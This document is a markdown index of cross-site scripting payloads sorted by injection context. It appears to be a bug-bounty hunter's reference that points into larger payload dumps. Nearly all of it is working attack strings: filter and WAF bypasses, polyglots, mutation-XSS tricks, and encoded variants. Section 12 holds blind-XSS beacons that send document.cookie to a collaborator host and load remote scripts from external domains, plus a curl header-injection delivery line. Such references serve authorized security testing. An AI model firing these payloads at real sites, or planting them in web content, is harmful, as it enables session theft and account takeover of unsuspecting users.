# XSS by Injection Context — Selection Index

> Purpose: pick the RIGHT payload for the reflection context instead of blasting a 1592-line dump.
> Raw sources (do not re-dump — grep them): `brain/payloads/xss.txt` (1592 lines), `brain/payloads/xss-waf-bypass.txt` (84 lines).
> Every payload below is copied **verbatim** from those files. Line refs are `xss.txt` unless noted `(waf)`.
> Workflow: (1) identify context from the "use when" rule, (2) fire the representative payloads, (3) if filtered, pull more with the grep recipe, (4) escalate to §11 encoding variants.

---

## Detection canary convention

- **Use a UNIQUE 4+ digit numeric canary**, e.g. `alert(91234)`, not `alert(1)`. `alert(1)`/`XSS`/`alert(document.domain)` collide with page decoys, other hunters' probes, and demo widgets — you can't tell YOUR reflection apart. A distinctive integer is greppable in responses and unambiguous in a screenshot.
- **Prefer a DOM marker over `alert()` for WAF-fronted / headless / stored contexts.** `alert`/`confirm`/`prompt` are (a) often the exact tokens a WAF blocks and (b) invisible to a headless crawler. Instead write a global you can read back:
  - `document.title=91234` — survives into the DOM, readable by a headless check.
  - `window.name=91234` / `window.canary91234=1` — persists across the page.
  - OOB beacon for blind/stored (see §12): `fetch('//<collab>/91234')`.
- Keep the canary constant across a single test run so every reflection maps back to one probe.
- The payloads below keep the source files' original `alert(1)` etc. — **swap the digit for your run's canary before firing.**

---

## 1. HTML body / new-tag injection

- **Use when:** your input reflects as raw HTML *between* tags (page source shows `<div>YOUR_INPUT</div>`), no surrounding quote/attribute. `<` and `>` come back un-encoded.
- **Breakout primitive:** none needed — inject a fresh element with an auto-firing handler (`onload`/`onerror`/`ontoggle`/`onloadstart`).
- **Representative payloads:**
```
<script>alert('XSS')</script>
<svg onload=alert(1)>
<svg/onload=alert(/XSS/)
<img src=x onerror=alert('XSS');>
<img onerror=alert(1) src=x>
<img src=x onerror=prompt(1)>//INJECTX
<details/open/ontoggle="alert`1`">
<video src=_ onloadstart="alert(1)">
<audio src onloadstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<body onload=alert(1)>
<svg/onload=alert(String.fromCharCode(88,83,83))>
```
- **Grep recipe:** `grep -iE 'onerror=|onload=|ontoggle=|onloadstart=|onfinish=' brain/payloads/xss.txt`

---

## 2. Attribute breakout (`" onX=` / `' onX=`)

- **Use when:** input lands inside an attribute value, e.g. `value="YOUR_INPUT"` or `href='YOUR_INPUT'`. You see your text between quotes in the tag.
- **Breakout primitive:** close the quote (and optionally the tag with `>`), then either add an event handler to the same element or start a new element. If quotes are stripped but you're already inside a tag, inject a bare handler + `autofocus`.
- **Representative payloads:**
```
"><img src=x onerror=alert('XSS');>
"><svg onload=alert(1)//
"><svg/onload=alert(/XSS/)
"><script>alert('XSS')</script>
"><img src=1 onerror=alert(1)>.gif
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
' onmouseover=alert(/Black.Spook/)
'onload=alert(1)><svg/1='
" onerror=alert()1 a="
"><input%252bTyPE%25253d"hxlxmj"... (see waf line 29 for full display:none autofocus chain)
```
- **Grep recipe:** `grep -iE '^["'\''\`].*on[a-z]+=|autofocus|onfocus=|onmouseover=' brain/payloads/xss.txt`

---

## 3. Inline `<script>` / JS-string breakout

- **Use when:** input reflects *inside* an existing `<script>` block, typically a string literal: `var user='YOUR_INPUT';` or `foo("YOUR_INPUT")`.
- **Breakout primitive:** terminate the string/statement (`'` `"` `` ` ``), run your JS, comment out the tail (`//`); OR close the whole `</script>` and open a fresh vector. Watch for backslash-escaping — prefix `\` to neutralize a defensive escape.
- **Representative payloads:**
```
'-alert(1)-'
'-alert(1)//
\'-alert(1)//
';alert(String.fromCharCode(88,83,83))//
\";alert('XSS');//
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
</script><svg onload=alert(1)>
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
</script>'"><img src=x onError=prompt(1)>
```
(last line is `waf` line 12)
- **Grep recipe:** `grep -aiE "';alert|\\\\';alert|-alert\(1\)|\*/alert|</script>" brain/payloads/xss.txt`

---

## 4. URL / href / `javascript:` scheme

- **Use when:** input becomes a link target — `href`, `src`, `action`, `formaction`, a `?redirect=`/`?next=`/`?returnUrl=` param, or any anchor the user clicks.
- **Breakout primitive:** supply a `javascript:` (or `data:text/html`) URI. Filters on the literal string are bypassed with entity/tab/newline obfuscation of the scheme.
- **Representative payloads:**
```
<a href="javascript:alert(1)">ssss</a>
<a href=javascript:alert(1)>click
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
/path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
```
(last three are `waf` lines 82, 83, 22)
- **Grep recipe:** `grep -iE 'href=.*javascript|src=.*javascript|data:text/html|redirect|&colon;' brain/payloads/xss.txt`

---

## 5. DOM sink (innerHTML, document.write, eval, location.hash, setTimeout-string)

- **Use when:** client-side JS reads an attacker-controlled *source* (`location.hash`, `location.search`, `document.URL`, `window.name`, `postMessage` data) and passes it to a *sink* (`.innerHTML`, `document.write`, `eval`, `setTimeout('str')`, `location=`) — no server round-trip needed. Confirm by reading the JS, not the HTML.
- **Breakout primitive:** control the source string so the sink executes it. For markup sinks deliver a tag; for JS sinks deliver code. The `#fragment` never leaves the browser, so it evades server-side WAFs entirely.
- **Representative payloads:**
```
innerHTML=location.hash>#<script>alert(1)</script>
eval(location.hash.slice(1)>#alert(1)
eval(URL.slice(-8))>#alert(1)
<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
<img src=x:alert(alt) onerror=eval(src) alt=xss>
<svg id=alert(1) onload=eval(id)>
<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
window.name='<payload>'
iframe.contentWindow.postMessage(payload, '*')
```
(the `location=...#javascript:alert(1)` line is `waf` 22)
- **Grep recipe:** `grep -iE 'location\.hash|location=|innerHTML|document\.write|eval\(|setTimeout|postMessage|\.name' brain/payloads/xss.txt`

---

## 6. SVG / MathML / XML

- **Use when:** reflection is inside an SVG/MathML/XML document, OR a sanitizer allow-lists SVG/MathML subtrees, OR you upload an `image/svg+xml`. These namespaces carry their own script + `xlink:href=javascript:` vectors that HTML-only filters miss.
- **Breakout primitive:** SVG `onload`/`<script>`, MathML/SVG `xlink:href="javascript:"`, `<animate ... from=javascript:...>`, XML namespace injection.
- **Representative payloads:**
```
<svg onload=alert(1)>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><script xlink:href=data:,alert(1) />
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
<foreignObject xlink:href="javascript:alert(88)"/>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
<math href="javascript:javascript:alert(1)">CLICKME</math>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><x xlink:href=javascript:confirm`1`>click
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
```
(`<math><x xlink:href=...>` is `waf` line 51)
- **Grep recipe:** `grep -iE '<svg|<math|xlink:href|foreignObject|<animate|<set |xmlns' brain/payloads/xss.txt`

---

## 7. Markdown / rich-text renderer

- **Use when:** input is rendered through a Markdown / rich-text / comment engine. Two sub-cases: (a) engine permits raw HTML passthrough → use any §1 tag; (b) engine escapes HTML but keeps link/image syntax → smuggle a `javascript:` URI through the link.
- **Breakout primitive:** Markdown link/image `[text](URI)` / `![alt](URI)` with a `javascript:` scheme (newline-obfuscated to survive URL-scheme sanitizers), or raw-HTML fallthrough.
- **Representative payloads:**
```
![xss](javascript:alert(1))
[xss](javascript://%0aalert(1))
```
Raw-HTML-passthrough fallback (when the renderer does not escape tags):
```
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">ssss</a>
```
- **Grep recipe:** `grep -nE '\]\(javascript' brain/payloads/xss.txt`  (only the two link forms live in the dump; combine with §1/§4 for raw-HTML renderers)

---

## 8. Template literal / framework interpolation (React / Angular / Vue / Handlebars)

- **Use when:** input flows into a client template or JS template string. Frameworks HTML-escape by default, so this fires only via the escape hatches: React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `[innerHTML]`/bypassSecurityTrust, Handlebars triple-`{{{ }}}`, or a server that drops your input into a JS backtick template `` `...${INPUT}...` ``.
- **Breakout primitive:** for `dangerouslySetInnerHTML`/`v-html`/`{{{ }}}` the sink is raw HTML → use §1 tags. For a JS template-literal context, break the `` ` `` / `${}` and run code; backtick-call form (`alert\`1\``) needs no parens.
- **Representative payloads:**
```
<img/src=x onError="`${x}`;alert(`Hello`);">
<svg/onload=alert`INJECTX`>
<details/open/ontoggle="alert`1`">
alert`1`
/*${/*/;{/**/(alert)(1)}//><Base/Href=//google.com\76-->
```
(first line is `waf` 66). Note: this dump is light on canonical AngularJS `{{constructor.constructor('...')()}}` sandbox payloads — if the target is old AngularJS, author that separately; for `dangerouslySetInnerHTML`/`v-html`/`[innerHTML]` sinks, the §1 body payloads are the correct choice.
- **Grep recipe:** `grep -naE '\$\{|alert\`|ontoggle="alert|onError="\`' brain/payloads/xss.txt`

---

## 9. Polyglots (one payload, many contexts)

- **Use when:** you cannot see the reflection context, or the same input hits multiple sinks (attribute + body + JS + comment). One string engineered to break out of all of them.
- **Breakout primitive:** stacked context terminators (`'` `"` `` ` `` `*/` `</script>` `</title>` `-->`) followed by a universal vector, arranged so at least one path executes.
- **Representative payloads:**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
xss"><!--><svg/onload=alert(document.domain)>
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
```
(The first is the Gareth Heyes / Ashar Javed classic; the marquee/plaintext monster is the 0xsobky-style polyglot.)
- **Grep recipe:** `grep -naE 'jaVasCript:/\*|JavaScript://%250A|marquee><img|Garethy|<!--></Title' brain/payloads/xss.txt`

---

## 10. Mutation XSS (mXSS) / sanitizer differentials

- **Use when:** content is sanitized and then **re-parsed or re-serialized** — DOMPurify-then-`innerHTML`, `foo.innerHTML = bar.innerHTML` round-trips, or markup that reparses inside `noscript`/`style`/`svg`/`title`/`template`. The sanitizer sees inert nodes; the browser mutates them into live markup on serialization.
- **Breakout primitive:** namespace/parsing-confusion — content that is a harmless text node in one parsing mode becomes an element in another (`<noscript>` with JS on, `<svg><style>`, unbalanced comment/CDATA).
- **Representative payloads:**
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>
<svg><style><img src=x onerror=alert(1)>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<!--<img src="--><img src=x onerror=alert(1)//">
<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
```
- **Grep recipe:** `grep -naE 'noscript|</style><img|</comment><img|<scr<script|<b <script|innerHTML = document' brain/payloads/xss.txt`

---

## 11. Encoding & WAF-differential variants (URL / HTML / entity / unicode / homoglyph)

- **Use when:** a literal payload is blocked (403 / stripped / `alert` filtered) but the sink still decodes. Exploit the gap: an encoding the WAF does NOT normalize but the browser DOES. Escalate here after a clean payload is refused.
- **Breakout primitive:** HTML-entity (`&#106;` / `&#x6A;`), URL-encode (`%3C`), double-URL-encode (`%25`), unicode escape (`a`), UTF-7 charset trick (`+ADw-`), homoglyph / fullwidth / mathematical-bold letters, and case/whitespace mangling.
- **Representative payloads (mostly from `xss-waf-bypass.txt`):**
```
<Svg/OnLoad=alert(1337)>"@gmail.com
<svg onload=alert&#0000000040document.cookie)>
<Img Src=//X55.is OnLoad%0C=import(Src)>
%3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E
<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
+ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<script>alert(1)</script>
top['al\x65rt'](1)
top[/al/.source+/ert/.source](1)
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e
¼script¾alert(¢XSS¢)¼/script¾
```
(rows 1-7 above are `waf` lines 5,7,9,10,14,31,26)
- **Grep recipe:** `grep -iE '&#[x0-9]|%3[cC]|%25|\\u00|\+AD|charset=|\.source|X55\.is' brain/payloads/xss.txt brain/payloads/xss-waf-bypass.txt`

---

## 12. Blind XSS / OOB callback (canary + collaborator)

- **Use when:** input is *stored* and later rendered somewhere you can't observe — admin dashboard, support-ticket viewer, log UI, generated PDF/email, back-office tool. You need an out-of-band signal because you never see the response.
- **Breakout primitive:** a self-beaconing payload that phones home to your collaborator on execution, carrying a canary (and optionally `document.cookie` / `document.domain` / the sink URL) so you know *where* it fired. Replace `<collab>` with your Burp Collaborator / interactsh / XSS-Hunter host and keep a per-injection-point canary in the path.
- **Representative payloads:**
```
<svg onload=fetch('//bxss-<sink>-<random>.<collab>/x')>
<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//<collab>/x?'+document.cookie)</script></svg>
<script>fetch('http://<collab>/x?file://etc/passwd')</script>
<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
<script src=//brutelogic.com.br/1.js>
"><script src=//brutelogic.com.br&sol;1.js&num;
<script src=//3334957647/1>
curl -H 'X-Forwarded-Host: x"><svg onload=fetch("//<collab>/x")>' https://target/
<img/src/onerror=import('//domain/')>"@yourdomain
013371337;ext=<img/src/onerror=import('//domain/')>
```
(last two are `waf` lines 2,3; the `curl X-Forwarded-Host` is the header-injection delivery form)
- **Grep recipe:** `grep -iE 'fetch\(|<collab>|<sink>|bxss|brutelogic|src=//|import\(|X-Forwarded-Host' brain/payloads/xss.txt brain/payloads/xss-waf-bypass.txt`

---

## 13. Length-limited / short-form payloads

- **Use when:** the field truncates (maxlength, DB column, short JSON field). Pick the shortest string that still executes. `<svg onload=...>` beats `<img src=x onerror=...>` by parser tolerance and length; backtick-call and comma/assignment tricks drop the parens overhead.
- **Breakout primitive:** minimal tag + shortest handler, or bare-JS forms when you're already in a script context.
- **Representative payloads (shortest first):**
```
alert`1`
(alert)(1)
a=alert,a(1)
[1].find(alert)
'-alert(1)//
<x onmouseover=alert(1)>hover this!
<svg/onload=alert(1)
<svg onload=alert(1)>
<body onload=alert(1)>
<script>alert(1)//
top["al"+"ert"](1)
<x onclick=alert(1)>click this!
```
- **Grep recipe:** `awk 'length>4 && length<=24' brain/payloads/xss.txt | grep -iE 'alert|svg|onerror|onload'`

---

### Cross-references
- Markup that reflects but does NOT execute JS (no `<script>`/handler firing) → HTML-injection, not XSS. See `hunt-html-injection`.
- Per-vuln hunting methodology and report gate → `hunt-xss` skill.
- Full raw corpus stays authoritative in `brain/payloads/xss.txt` + `brain/payloads/xss-waf-bypass.txt`; this file is the router into them.
